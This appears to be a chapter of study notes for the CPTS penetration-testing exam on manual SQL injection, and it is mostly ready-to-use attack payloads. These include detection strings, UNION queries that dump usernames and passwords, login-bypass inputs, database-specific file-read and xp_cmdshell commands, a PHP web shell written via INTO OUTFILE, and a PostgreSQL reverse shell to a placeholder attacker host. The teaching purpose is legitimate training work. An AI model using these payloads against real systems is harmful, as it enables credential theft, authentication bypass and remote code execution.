# 15 — SQL Injection Fundamentals

The CPTS path covers manual SQL injection before SQLMap because you need to understand what's happening. On the exam, manual SQLi proves competence in your report, and some injection points need manual handling before SQLMap can automate extraction.

---

## How SQL Injection Works

A web application builds SQL queries using your input. If it doesn't sanitize the input, your data becomes part of the query structure — not just query data.

```
SAFE (parameterized query):
  "SELECT * FROM users WHERE id = ?" → your input fills the ? placeholder
  The database treats your input as DATA, never as SQL code

VULNERABLE (string concatenation):
  "SELECT * FROM users WHERE id = " + your_input
  The database can't distinguish your input from the SQL code
  If your input contains SQL syntax, it becomes part of the query
```

---

## Detection — Finding Injectable Parameters

### Step 1: Identify inputs

Every parameter is a potential injection point:

```
URL parameters:      /page.php?id=1&category=electronics
POST body:           username=admin&password=test
HTTP headers:        Cookie: session=abc123; User-Agent: Mozilla
JSON body:           {"id": 1, "search": "laptop"}
```

### Step 2: Test with payloads

```
'              Single quote — breaks string delimiters
"              Double quote — breaks string delimiters
1 OR 1=1       Boolean test — always true
1 AND 1=2      Boolean test — always false (changes output if injectable)
1; --          Statement terminator + comment
1' OR '1'='1   Quote-aware boolean
```

**What to look for in the response:**

```
SQL error message → CONFIRMED injectable (error-based)
Different content with OR 1=1 vs AND 1=2 → CONFIRMED (boolean-based)
Time delay with SLEEP(5) → CONFIRMED (time-based blind)
Same response regardless → probably not injectable (or blind)
```

---

## Injection Types

### Error-based (easiest — errors show data)

The application shows SQL error messages that contain data:

```
Input: 1'
Error: You have an error in your SQL syntax near '1'' at line 1
→ Confirms injection AND reveals it's MySQL (from the error format)

Input: 1' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))-- -
Output: XPATH syntax error: '~10.11.6-MariaDB'
→ The version is embedded in the error message
```

### UNION-based (most useful — extract data in the response)

Append a second SELECT query. Its results appear alongside the original query's output.

**The UNION process (memorize this — you'll do it on every exam):**

```bash
# Step 1: Find the column count
# ORDER BY tells SQL to sort by column N. If N doesn't exist → error.
?id=1 ORDER BY 1    # works
?id=1 ORDER BY 2    # works
?id=1 ORDER BY 3    # works
?id=1 ORDER BY 4    # ERROR → only 3 columns

# Alternative: UNION SELECT with increasing NULLs
?id=1 UNION SELECT NULL           # error (wrong column count)
?id=1 UNION SELECT NULL,NULL      # error
?id=1 UNION SELECT NULL,NULL,NULL # works → 3 columns

# Step 2: Find displayable columns
?id=-1 UNION SELECT 1,2,3
# Response shows numbers where data appears in the page
# If "2" appears in the product name field → column 2 is displayable

# Step 3: Extract data through displayable columns
?id=-1 UNION SELECT 1,@@version,3              # database version
?id=-1 UNION SELECT 1,database(),3              # current database
?id=-1 UNION SELECT 1,user(),3                  # current DB user

# Step 4: List databases
?id=-1 UNION SELECT 1,GROUP_CONCAT(schema_name),3 FROM information_schema.schemata

# Step 5: List tables
?id=-1 UNION SELECT 1,GROUP_CONCAT(table_name),3 FROM information_schema.tables WHERE table_schema='target_db'

# Step 6: List columns
?id=-1 UNION SELECT 1,GROUP_CONCAT(column_name),3 FROM information_schema.columns WHERE table_name='users'

# Step 7: Extract data
?id=-1 UNION SELECT 1,GROUP_CONCAT(username,0x3a,password SEPARATOR 0x0a),3 FROM users
# 0x3a = colon (:)    0x0a = newline
# Output: admin:Adm1nP@ss!\nmanager:Manag3r!
```

### Boolean-based blind (no visible output — slower)

The page doesn't show data or errors, but it responds differently to TRUE vs FALSE conditions:

```
?id=1 AND 1=1    → normal page (TRUE condition)
?id=1 AND 1=2    → different page or empty (FALSE condition)

Extract data one character at a time:
?id=1 AND SUBSTRING(database(),1,1)='a'    → false (different response)
?id=1 AND SUBSTRING(database(),1,1)='s'    → true (normal response)
?id=1 AND SUBSTRING(database(),2,1)='h'    → true
→ Database name starts with "sh..."

This is extremely slow manually. Use SQLMap for blind injection.
```

### Time-based blind (no visible difference — slowest)

No difference in response at all. Inject a delay and measure response time:

```
?id=1 AND SLEEP(5)    → response takes 5 seconds → injectable!

Extract data:
?id=1 AND IF(SUBSTRING(database(),1,1)='s', SLEEP(5), 0)
→ If the first character is 's', wait 5 seconds
→ Measure the response time to determine TRUE or FALSE

Even slower than boolean. Always use SQLMap for this.
```

---

## Database-Specific Syntax

### MySQL / MariaDB

```sql
-- Version
SELECT @@version

-- Current database
SELECT database()

-- List databases
SELECT schema_name FROM information_schema.schemata

-- List tables
SELECT table_name FROM information_schema.tables WHERE table_schema='db_name'

-- List columns
SELECT column_name FROM information_schema.columns WHERE table_name='users'

-- Read files
SELECT LOAD_FILE('/etc/passwd')

-- Write files
SELECT '<?php system($_GET["cmd"]); ?>' INTO OUTFILE '/var/www/html/shell.php'

-- Comment syntax
-- (double dash + space)
#
/* */
```

### MSSQL (Microsoft SQL Server)

```sql
-- Version
SELECT @@version

-- Current database
SELECT DB_NAME()

-- List databases
SELECT name FROM master.sys.databases

-- List tables
SELECT name FROM db_name..sysobjects WHERE xtype='U'

-- Command execution (if xp_cmdshell is enabled)
EXEC xp_cmdshell 'whoami'

-- Enable xp_cmdshell
EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;

-- Comment syntax
-- (double dash + space)
/* */
```

### PostgreSQL

```sql
-- Version
SELECT version()

-- Current database
SELECT current_database()

-- List databases
SELECT datname FROM pg_database

-- List tables
SELECT tablename FROM pg_tables WHERE schemaname='public'

-- Read files
SELECT pg_read_file('/etc/passwd')

-- Command execution
COPY (SELECT '') TO PROGRAM 'whoami'

-- Comment syntax
-- (double dash + space)
/* */
```

---

## Authentication Bypass

### Login form SQLi

```
Username: ' OR 1=1-- -
Password: anything

Query becomes:
SELECT * FROM users WHERE username='' OR 1=1-- -' AND password='anything'
                                    ^^^^^^^^      ^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                    always true   commented out (ignored)

Returns all users → logs you in as the first user (usually admin)
```

**Login as a specific user:**

```
Username: admin'-- -
Password: anything

Query becomes:
SELECT * FROM users WHERE username='admin'-- -' AND password='anything'
                                          ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
                                          commented out — password not checked
```

---

## From SQLi to Remote Code Execution

### MySQL — write a web shell

```sql
' UNION SELECT 1,'<?php system($_GET["cmd"]); ?>',3 INTO OUTFILE '/var/www/html/shell.php'-- -
```

**Requirements:** FILE privilege for the DB user, writable web root, known web root path.

Then: `http://TARGET/shell.php?cmd=whoami`

### MSSQL — xp_cmdshell

```sql
'; EXEC xp_cmdshell 'whoami'-- -
```

**Requirements:** SA (sysadmin) privileges or xp_cmdshell already enabled.

### PostgreSQL — COPY TO PROGRAM

```sql
'; COPY (SELECT '') TO PROGRAM 'bash -c "bash -i >& /dev/tcp/KALI/4444 0>&1"'-- -
```

---

## SQLi → SQLMap Handoff

Once you confirm injection manually, switch to SQLMap for efficient extraction:

```bash
# Save the request from Burp Suite
# Then:
sqlmap -r request.txt --batch --dbs
sqlmap -r request.txt --batch -D dbname --tables
sqlmap -r request.txt --batch -D dbname -T users --dump
```

Manual confirmation → SQLMap extraction. Best of both worlds.
